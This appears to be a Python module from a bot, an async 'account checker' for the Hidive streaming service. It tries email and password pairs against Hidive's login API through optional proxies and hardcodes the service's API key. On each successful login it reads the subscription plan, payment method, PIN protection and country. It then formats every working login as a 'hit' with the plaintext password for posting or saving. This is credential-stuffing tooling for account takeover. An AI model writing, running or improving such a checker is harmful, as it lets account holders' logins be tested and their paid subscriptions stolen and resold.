"""
bot/modules/hidive.py
~~~~~~~~~~~~~~~~~~~~~
Async Hidive account checker using ``aiohttp``.

Ported from the original ``Hd.py`` synchronous script.
"""

from __future__ import annotations

import json
from typing import Optional

import aiohttp

from bot.utils.logger import setup_logger

log = setup_logger("mod.hidive")

# ── Public API constants (Hidive / DCE front-office) ────────────────────
_API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
_APP_VAR = "6.57.10.b20743c"
_LOGIN_URL = "https://dce-frontoffice.imggaming.com/api/v2/login"
_LICENCE_URL = (
    "https://dce-frontoffice.imggaming.com/api/v2/licence-family"
    "?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS"
)
_PROFILE_URL = "https://dce-frontoffice.imggaming.com/api/v1/profile"
_ADDRESS_URL = "https://dce-frontoffice.imggaming.com/api/v2/user/address"

_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Realm": "dce.hidive",
    "x-api-key": _API_KEY,
    "x-app-var": _APP_VAR,
    "app": "dice",
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36"
    ),
}


async def check_account(
    email: str,
    password: str,
    session: aiohttp.ClientSession,
    proxy: Optional[str] = None,
) -> Optional[dict]:
    """Check a single Hidive account.

    Returns a dict with hit details on success, or ``None`` on
    failure / inactive subscription / bad credentials.
    """
    try:
        # 1. Login
        payload = {"id": email, "secret": password}
        async with session.post(
            _LOGIN_URL, json=payload, headers=_HEADERS, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=15),
        ) as r1:
            body = await r1.text()
            if "authorisationToken" not in body:
                return None
            login_data = json.loads(body)

        token = login_data["authorisationToken"]
        auth_headers = {**_HEADERS, "Authorization": f"Bearer {token}"}

        # 2. Subscription check
        async with session.get(
            _LICENCE_URL, headers=auth_headers, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r2:
            lic_text = await r2.text()

        if 'status":"ACTIVE' not in lic_text:
            return None  # No active subscription.

        lic_data = json.loads(lic_text)
        family = lic_data.get("licenceFamilies", [{}])[0]
        ent = family.get("entitlements", [{}])[0]

        v_type = ent.get("type", "STANDARD")
        v_name = ent.get("name", "MONTHLY")
        auto_renew = family.get("autoRenewingStatus") == "AUTO_RENEWING"

        raw_pay = family.get("paymentProviderInfo", {}).get("type", "STRIPE")
        if raw_pay == "APPLE_IAP":
            pay_method = "App Store"
        elif raw_pay == "GOOGLE_IAP":
            pay_method = "Play Store"
        else:
            pay_method = "Stripe"

        # 3. Profile & country
        async with session.get(
            _PROFILE_URL, headers=auth_headers, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r_prof:
            prof_data = await r_prof.json()
        pin_protected = prof_data.get("pinProtection") == "PROTECTED"

        async with session.get(
            _ADDRESS_URL, headers=auth_headers, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r_addr:
            addr_data = await r_addr.json()
        country_code = addr_data.get("countryCode", "US")
        country = "United States 🇺🇸" if country_code == "US" else country_code

        return {
            "email": email,
            "password": password,
            "type": v_type,
            "name": v_name,
            "renewing": auto_renew,
            "payment": pay_method,
            "pin_protected": pin_protected,
            "country": country,
        }

    except (aiohttp.ClientError, TimeoutError, KeyError, TypeError) as exc:
        log.debug("HD check failed for %s: %s", email, exc)
        return None


def format_hit(hit: dict) -> str:
    """Format a hit dictionary into a user-friendly string."""
    renew = "YES ✅" if hit["renewing"] else "NO ❌"
    pin = "YES ✅" if hit["pin_protected"] else "NO ❌"
    return (
        f"📺 **Hidive Hit**\n"
        f"┣ **Email:** `{hit['email']}`\n"
        f"┣ **Password:** `{hit['password']}`\n"
        f"┣ **Plan:** 〖{hit['type']}〗-[{hit['name']}]\n"
        f"┣ **Payment:** {hit['payment']}\n"
        f"┣ **Renewing:** {renew}\n"
        f"┣ **PIN Protected:** {pin}\n"
        f"┗ **Country:** {hit['country']}"
    )


def format_hit_line(hit: dict) -> str:
    """One-line format for results file."""
    renew = "YES" if hit["renewing"] else "NO"
    pin = "YES" if hit["pin_protected"] else "NO"
    return (
        f"{hit['email']}:{hit['password']} | "
        f"Plan={hit['type']}-{hit['name']} | Pay={hit['payment']} | "
        f"Renew={renew} | PIN={pin} | Country={hit['country']}"
    )
